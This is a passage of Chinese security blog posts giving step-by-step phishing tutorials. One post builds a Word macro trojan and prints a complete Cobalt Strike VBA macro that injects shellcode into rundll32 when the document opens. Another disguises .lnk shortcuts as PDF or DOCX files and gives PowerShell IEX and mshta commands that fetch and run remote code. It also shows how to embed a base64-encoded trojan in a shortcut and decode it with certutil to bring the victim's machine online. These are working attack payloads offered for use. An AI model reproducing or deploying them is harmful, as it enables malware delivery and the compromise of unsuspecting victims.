<h5 id="高级–-gt-更新-gt-解压并更新文件，覆盖所有文件"><a href="#高级–-gt-更新-gt-解压并更新文件，覆盖所有文件" class="headerlink" title="高级–&gt;更新 -&gt; 解压并更新文件，覆盖所有文件"></a>高级–&gt;更新 -&gt; 解压并更新文件，覆盖所有文件</h5><p><img src="/images/1665317150871-d5ed23a9-47f4-44d0-a47e-abf3dbb63591.png"></p>
<h5 id="双击"><a href="#双击" class="headerlink" title="双击"></a>双击</h5><h5 id="先弹出计算器"><a href="#先弹出计算器" class="headerlink" title="先弹出计算器"></a>先弹出计算器</h5><p><img src="/images/1665317918396-40235dea-0ae8-4939-91b8-42409759d59c.png"></p>
<h5 id="cs成功上线"><a href="#cs成功上线" class="headerlink" title="cs成功上线"></a>cs成功上线</h5><p><img src="/images/1665317977878-2becd632-5ee4-4a3e-afc7-5ed27e5329da.png"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>在添加压缩包时，勾选两个程序压缩，不要直接压缩文件夹</p>
<p><img src="/images/1665318023941-7e45189b-7ce7-4048-b810-22cd73e705d4.png"></p>
<p>否则找不到cs马程序，由于calc就存在于环境变量中，如果选中整个文件夹压缩，则只会弹出计算机</p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>word宏钓鱼(office)</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/word%E5%AE%8F%E9%92%93%E9%B1%BC(office)/</url>
    <content><![CDATA[<h2 id="在word选项中开启开发工具"><a href="#在word选项中开启开发工具" class="headerlink" title="在word选项中开启开发工具"></a>在word选项中开启开发工具</h2><p><img src="/images/1665293897653-48340ebf-6b7c-492e-9007-ca30f830d18f.png"></p>
<p><img src="/images/1665293933408-6451566b-7701-449a-a4b6-5c549b170877.png"></p>
<h2 id="打开宏"><a href="#打开宏" class="headerlink" title="打开宏"></a>打开宏</h2><p><img src="/images/1665294028952-3833e433-91a9-4cca-8079-9dafaab179e2.png"></p>
<h2 id="Cobalt-Strike生成木马"><a href="#Cobalt-Strike生成木马" class="headerlink" title="Cobalt Strike生成木马"></a>Cobalt Strike生成木马</h2><p><img src="/images/1665294207495-ae047a08-4c43-4175-840d-8014db72527d.png"></p>
<p><img src="/images/1665294244105-2ded9f7b-9ed4-4bea-8117-3168f994c6da.png"></p>
<h5 id="cs宏木马"><a href="#cs宏木马" class="headerlink" title="cs宏木马"></a>cs宏木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,-66,47,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,105,53,107,83,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,84,114,105,100,101,110,116,47,54,46,48,59,32,84, _</span><br><span class="line">111,117,99,104,41,13,10,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82, _</span><br><span class="line">45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80, _</span><br><span class="line">37,64,65,80,91,52,92,80,90,88,53,52,40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78, _</span><br><span class="line">84,73,86,73,82,85,83,45,84,69,83,84,45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,88,53,52, _</span><br><span class="line">40,80,94,41,55,67,67,41,55,125,36,69,73,67,65,82,45,83,84,65,78,68,65,82,68,45,65,78,84,73,86,73,82,85,83,45,84,69,83,84, _</span><br><span class="line">45,70,73,76,69,33,36,72,43,72,42,0,53,79,33,80,37,64,65,80,91,52,92,80,90,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,49,52,46,53,53,46,49,55,51,46,49,48,54,0,0,0,0,0)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<h2 id="新建宏"><a href="#新建宏" class="headerlink" title="新建宏"></a>新建宏</h2><p><img src="/images/1665295163943-5e1d2dc8-9da3-4be5-b0b1-7b3c4e96b6e6.png"></p>
<h2 id="把CS生成的宏木马粘贴进去，保存"><a href="#把CS生成的宏木马粘贴进去，保存" class="headerlink" title="把CS生成的宏木马粘贴进去，保存"></a>把CS生成的宏木马粘贴进去，保存</h2><p><img src="/images/1665295205355-ffa67bf5-f5a5-4c21-938a-f672c9a9e30d.png"></p>
<h2 id="再打开word发现成功上线"><a href="#再打开word发现成功上线" class="headerlink" title="再打开word发现成功上线"></a>再打开word发现成功上线</h2><p><img src="/images/1665295332033-89c74d16-186b-478d-a6de-0c10ba830bd9.png"></p>
<p>注意，仅适用于office，wps打开没用</p>
<h2 id="删除宏"><a href="#删除宏" class="headerlink" title="删除宏"></a>删除宏</h2><p><img src="/images/1665295729694-0edd64a9-937b-4983-8e15-b58386074fd4.png"></p>
<p><img src="/images/1665295750277-409bb8c9-1ef0-4a9b-ad10-c4e2334bceb8.png"></p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>快捷方式钓鱼再谈</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E9%92%93%E9%B1%BC%E5%86%8D%E8%B0%88/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h5 id="恶意的快捷方式，一般利用方式有如下三种"><a href="#恶意的快捷方式，一般利用方式有如下三种" class="headerlink" title="恶意的快捷方式，一般利用方式有如下三种"></a>恶意的快捷方式，一般利用方式有如下三种</h5><p>通过伪装的lnk文件，执行当前目录下某个恶意文件（一般会设为隐藏文件）</p>
<p>通过伪装的lnk文件，加载并执行远程的恶意代码</p>
<p>仅存放一个link文件，执行自身的恶意代码</p>
<h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4><p>详细在windows相关–&gt;隐藏文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib +h +s output.apk</span><br></pre></td></tr></table></figure>

<h5 id="Lnk快捷方式执行相对路径程序"><a href="#Lnk快捷方式执行相对路径程序" class="headerlink" title="Lnk快捷方式执行相对路径程序"></a>Lnk快捷方式执行相对路径程序</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe url.dll,FileProtocolHandler xxx.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c start xxx.exe</span><br></pre></td></tr></table></figure>

<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>当我们使用cmd时，或是待执行的恶意文件为bat等文件时，会闪出一个黑窗口(一闪而过)，这时可设置其运行方式为”最小化”，以避免此问题。</p>
<p><img src="/images/1665399584783-4a90924b-8f0c-47fc-a810-77cfb579cc17.png"></p>
<h2 id="设置快捷方式图标"><a href="#设置快捷方式图标" class="headerlink" title="设置快捷方式图标"></a>设置快捷方式图标</h2><p>之前谈过快捷方式的图标在属性中就可以修改</p>
<p><img src="/images/1665399815623-547671f3-5d72-439f-b4e7-530b45e210f5.png"></p>
<p>以pdf文件为例，在windows系统中，pdf文件展示的图标一般是第三方应用的图标，有些默认用chrome打开pdf文件，那pdf文件的图标在他的电脑上就是chrome的图标，有些默认用 Adobe Reader，则pdf文件的图标在他的电脑上是 Adobe Reader图标。</p>
<p>自定义的图标，在快捷方式中存储的是路径，传到其他主机中，需要将图标文件同时上传，还需要修改路径</p>
<p><img src="/images/1665400568290-c88146d9-1e75-41fa-9f44-2a81aa0125ed.png"></p>
<p>怎么将文件的图标随目标系统的默认配置而修改？</p>
<h2 id="LNK文件的结构"><a href="#LNK文件的结构" class="headerlink" title="LNK文件的结构"></a>LNK文件的结构</h2><p>LNK文件的结构，我们可以找到一个字段: ICON_LOCATION，当设置了 HasIconLocation标识后，可通过 ICON_LOCATION来指定这个快捷方式使用图标。对应了快捷方式属性设置中的”更改图标”操作，如下图所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.lnk 文件格式</span><br><span class="line">+---------------------------+</span><br><span class="line">| lnk file header |</span><br><span class="line">+---------------------------+ &gt;------.</span><br><span class="line">| Shell Item Id List | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| File location info | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| Description string | |</span><br><span class="line">+---------------------------+ ---</span><br><span class="line">| Relative path string | 这几个节不是每一个都必须存在，如果存在就要按这样的顺序关系排列。</span><br><span class="line">+---------------------------+ ---</span><br><span class="line">| Working directory string | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| Command line string | |</span><br><span class="line">+---------------------------+ |</span><br><span class="line">| Icon filename string | |</span><br><span class="line">+---------------------------+ &gt;------.</span><br><span class="line">| Extra stuff |</span><br><span class="line">+---------------------------+ </span><br></pre></td></tr></table></figure>

<p><img src="/images/1665417001715-4305fe44-bea6-4ea2-95da-b5ba2fe80b08.png"></p>
<p>这里可以拿010Editor对其进行更改</p>
<h5 id="创建快捷方式"><a href="#创建快捷方式" class="headerlink" title="创建快捷方式"></a>创建快捷方式</h5><p>注意，要先更换图标，才能进行后续的操作</p>
<p><img src="/images/1665448852141-39226b39-0239-477a-9946-f1dbb2c9f376.png"></p>
<p>因为更改图标后010打开才会出现icon字段</p>
<p><img src="/images/1665449026463-c440ef39-245d-490b-8e58-4e42455e9df2.png"></p>
<p>更改图标后多出一个ICON_LOCATION字段</p>
<p><img src="/images/1665449054639-c001cccf-734f-41f9-b24d-ee553bac9a9f.png"></p>
<p>从21 00开始</p>
<p><img src="/images/1665401068556-49d67a9a-578d-4596-a01b-66a7f2d0ad33.png"></p>
<p>将 ICON_LOCATION字段设置为 .\xx.pdf，当然 xx可随意设置，不存在的文件也可。</p>
<h5 id="将这一段的16进制值改为"><a href="#将这一段的16进制值改为" class="headerlink" title="将这一段的16进制值改为"></a>将这一段的16进制值改为</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2E 00 5C 00 78 00 2E 00 70 00 64 00 66 ......后面都是00....10 00</span><br></pre></td></tr></table></figure>

<h5 id="也可以通过模板直接修改"><a href="#也可以通过模板直接修改" class="headerlink" title="也可以通过模板直接修改"></a>也可以通过模板直接修改</h5><p><img src="/images/1665449148607-4fc1a94d-4fc2-4c19-b1c7-3ec8f0013236.png"></p>
<p>将ICON_LOCATION字段更改为.\xx.pdf</p>
<p>这里的xx改成啥都行，不一定是存在的文件名</p>
<p><img src="/images/1665449361659-84c1501a-3175-4f82-ae7b-2c277af2d638.png"></p>
<h5 id="可以看到已经更改"><a href="#可以看到已经更改" class="headerlink" title="可以看到已经更改"></a>可以看到已经更改</h5><p><img src="/images/1665449372237-68597204-7e1d-470f-856a-8fc5a08f79a9.png"></p>
<h5 id="放到其他机器，成功按照默认配置显示"><a href="#放到其他机器，成功按照默认配置显示" class="headerlink" title="放到其他机器，成功按照默认配置显示"></a>放到其他机器，成功按照默认配置显示</h5><p><img src="/images/1665449469739-97141389-28dc-4373-ae25-98d3b281d018.png"></p>
<h5 id="改为docx"><a href="#改为docx" class="headerlink" title="改为docx"></a>改为docx</h5><p><img src="/images/1665449615993-a1978ba5-f4c6-49e5-b18a-a954c6ccb14b.png"></p>
<p><img src="/images/1665449654644-b26a1cdd-ff1d-4735-821d-54c1510947b0.png"></p>
<h5 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h5><p>更换自己的图标后，更改时和ico_Location字段的前两16进制数无关</p>
<p><img src="/images/1665449969327-f7402ddf-2429-4e63-b3e5-b4cbd722a464.png">‘</p>
<p>使用自定义的ico，ico_Location中的第一个字段变为19</p>
<p><img src="/images/1665450085655-738f35b4-d579-4079-8302-b9bd95e5d8bd.png"></p>
<p>更改ico_Location中的第二个字段为.\xxxx.pdf后仍然有效</p>
<p><img src="/images/1665450145199-70b7fc0d-971b-4570-895c-fad9710d47f4.png"></p>
<h2 id="更改快捷方式后缀"><a href="#更改快捷方式后缀" class="headerlink" title="更改快捷方式后缀"></a>更改快捷方式后缀</h2><p>这个直接改就行</p>
<p><img src="/images/1665451416694-f98ca1eb-6679-4cd2-afb5-586a8c6b1bc6.png"></p>
<p>双击后仍然弹出计算器</p>
<p><img src="/images/1665451441107-aab9bf48-9cdf-405f-af74-2aa42095d97a.png"></p>
<h2 id="执行恶意程序"><a href="#执行恶意程序" class="headerlink" title="执行恶意程序"></a>执行恶意程序</h2><h5 id="执行远程恶意代码"><a href="#执行远程恶意代码" class="headerlink" title="执行远程恶意代码"></a>执行远程恶意代码</h5><p>相对于“执行恶意文件”，该方式仅需一个lnk文件即可完成攻击。</p>
<p>相当于远程执行命令，可通过mshta、powershell、msiexec、bitsadmin等方式加载远程指令</p>
<h5 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12280/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665455158285-a07780b0-f8a2-436f-92d3-172649413911.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://1.1.1.1:12280/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<h5 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\mshta.exe http://xx.xxx/x</span><br></pre></td></tr></table></figure>

<p>当然，以这种形式很很容被检测到，且直接执行这种敏感命令也很难做到免杀。</p>
<h5 id="点击即上线"><a href="#点击即上线" class="headerlink" title="点击即上线"></a>点击即上线</h5><p><img src="/images/1665455262391-83d350e1-622d-43ea-967b-26c533c572b5.png"></p>
<h2 id="执行自身恶意代码"><a href="#执行自身恶意代码" class="headerlink" title="执行自身恶意代码"></a>执行自身恶意代码</h2><p>相对于上面的需要从远程加载恶意代码，此方式会将恶意代码藏在lnk文件本身中</p>
<p>运行时解密释放对应的恶意代码，实现利用</p>
<h5 id="大致逻辑"><a href="#大致逻辑" class="headerlink" title="大致逻辑"></a>大致逻辑</h5><p>将base64编码后的恶意代码追加至 lnk 文件中</p>
<p>用findstr提取对应的恶意编码</p>
<p>certutil -decode对恶意编码进行解码，输出至文件中</p>
<p>本地执行此文件</p>
<p>这里以嵌入执行artifact.exe(CS马)为例</p>
<h5 id="将恶意代码追加写进Lnk文件"><a href="#将恶意代码追加写进Lnk文件" class="headerlink" title="将恶意代码追加写进Lnk文件"></a>将恶意代码追加写进Lnk文件</h5><p>需要注意，在实际的处理中，这一步需要在lnk文件设置完后执行。</p>
<p>否则更改了lnk的目标后，原本追加的内容会被清空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; evil3.pdf.lnk     # 回车换行</span><br><span class="line">base64 -w 0 calc.exe &gt;&gt; evil3.pdf.lnk  # base64编码后追加进lnk文件</span><br><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; evil3.pdf.lnk     # 回车换行</span><br></pre></td></tr></table></figure>

<h5 id="首先先把快捷方式做好"><a href="#首先先把快捷方式做好" class="headerlink" title="首先先把快捷方式做好"></a>首先先把快捷方式做好</h5><p>这里用的是计算机的快捷方式，并把图标修改为pdf</p>
<p><img src="/images/1665456893419-6732528f-be69-4471-bfa8-75d494ee4282.png"></p>
<h5 id="windows没有printf命令可以用git的bash"><a href="#windows没有printf命令可以用git的bash" class="headerlink" title="windows没有printf命令可以用git的bash"></a>windows没有printf命令可以用git的bash</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; cmd.pdf.lnk     # 回车换行</span><br><span class="line">base64 -w 0 artifact.exe &gt;&gt; cmd.pdf.lnk  # base64编码后追加进lnk文件</span><br><span class="line">printf &#x27;\x0d\x0a&#x27; &gt;&gt; cmd.pdf.lnk     # 回车换行</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665457436660-0e1931a0-156d-4f54-9726-9672922fc98c.png"></p>
<h5 id="从0D-0A一直到最后的0D-0A就是我们追加进的木马"><a href="#从0D-0A一直到最后的0D-0A就是我们追加进的木马" class="headerlink" title="从0D 0A一直到最后的0D 0A就是我们追加进的木马"></a>从0D 0A一直到最后的0D 0A就是我们追加进的木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0d------回车符号－－－－－－&quot;\r&quot;</span><br><span class="line">0a------换行符号－－－－－－&quot;\n&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665457676104-165a6e44-8cd9-4c32-8fd1-ec68a836831c.png"></p>
<h5 id="findstr提取对应的恶意编码"><a href="#findstr提取对应的恶意编码" class="headerlink" title="findstr提取对应的恶意编码"></a>findstr提取对应的恶意编码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /?</span><br><span class="line">在文件中寻找字符串。</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665458045962-5cc05b52-b081-4991-ab42-fb2a8684ad09.png"></p>
<h5 id="base64编码后的前缀是TVqQAAMAAAAEAAA"><a href="#base64编码后的前缀是TVqQAAMAAAAEAAA" class="headerlink" title="base64编码后的前缀是TVqQAAMAAAAEAAA"></a>base64编码后的前缀是TVqQAAMAAAAEAAA</h5><p><img src="/images/1665458144402-e009022e-fd8e-4de6-b92a-7609fd3b0664.png"></p>
<h5 id="提取出恶意编码，输入到临时文件"><a href="#提取出恶意编码，输入到临时文件" class="headerlink" title="提取出恶意编码，输入到临时文件"></a>提取出恶意编码，输入到临时文件</h5><p>使用findstr对其进行查找，提取出恶意编码，输入到临时文件</p>
<p>这里需要注意，findstr直接查找 lnk 文件时，会去查找对应的目标文件</p>
<p>所以需要复制自身为一个普通的二进制文件后再进行查找</p>
<p>cmd有copy命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy cmd.pdf.lnk ./cmdhack</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665458893172-47f4279c-5d0f-4c15-9be5-42f619aedf41.png"></p>
<p>findstr提取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr &quot;TVqQAAMAAAAEAAA&quot; ./cmdhack &gt; ./hack</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665458966398-42a23069-5d02-425d-9ca6-75e47102cf80.png"></p>
<h5 id="certutil-解码提取源文件"><a href="#certutil-解码提取源文件" class="headerlink" title="certutil 解码提取源文件"></a>certutil 解码提取源文件</h5><p>该命令在cmd中即可运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -decode ./hack ./hack.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665459124727-bb6812a6-5658-4148-a4cc-76262d60e76d.png"></p>
<h5 id="最后一步，运行hack-exe"><a href="#最后一步，运行hack-exe" class="headerlink" title="最后一步，运行hack.exe"></a>最后一步，运行hack.exe</h5><p>成功上线</p>
<p><img src="/images/1665459202295-1d77853f-1775-48cf-89c1-bf3c93412425.png"></p>
<h5 id="将上述命令用-amp-串联"><a href="#将上述命令用-amp-串联" class="headerlink" title="将上述命令用&amp;串联"></a>将上述命令用&amp;串联</h5><p>用&amp;&amp;在最后一步执行exe时候会卡住，暂时还不知道为啥</p>
<p>并将输出的文件放入%temp%（每台机子都有且有权限的路径就行）</p>
<p>注意路径斜杠的方向</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c copy cmd.pdf.lnk %temp%\cmdhack &amp; findstr &quot;TVqQAAMAAAAEAAA&quot; %temp%\cmdhack &gt; %temp%\hack &amp; certutil -decode %temp%\hack %temp%\cmd.exe &amp; %temp%\cmd.exe</span><br></pre></td></tr></table></figure>

<p>本地执行</p>
<p><img src="/images/1665467986539-d2a3a6a4-b67c-4c40-8c8b-0e2b34036c8f.png"></p>
<p>成功上线</p>
<p><img src="/images/1665467942850-b3dfbf5a-151a-49a2-98f1-c85ffdb9bae1.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以该方式就是，提前将恶意程序的base64追加到快捷方式</p>
<p>发送给受害机</p>
<p>受害机执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.用findstr提取对应的恶意编码</span><br><span class="line"></span><br><span class="line">2.certutil -decode对恶意编码进行解码，输出至文件中</span><br><span class="line"></span><br><span class="line">3.本地执行此文件</span><br></pre></td></tr></table></figure>

<p>成功上线</p>
<p>该方式只会在最后一步，本地执行此文件进行查杀，所以将exe的免杀做好就行</p>
<h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2><p>要先设置目标后再进行恶意负载的追加</p>
<p><img src="/images/1665472045813-2bc1ed2f-1f30-4b91-b6a4-748bb7fc8146.png"></p>
<p>因为目标已修改，追加的内容同时也会被刷新没掉</p>
<p><img src="/images/1665474274726-1565b7a5-f3bc-49ca-b6e7-043b05f3d39d.png"></p>
<h2 id="过长参数处理"><a href="#过长参数处理" class="headerlink" title="过长参数处理"></a>过长参数处理</h2><p>部分主机中，快捷方式指定的参数存在长度限制，当我们想要设置复杂的命令时，会被截断，无法有效运行</p>
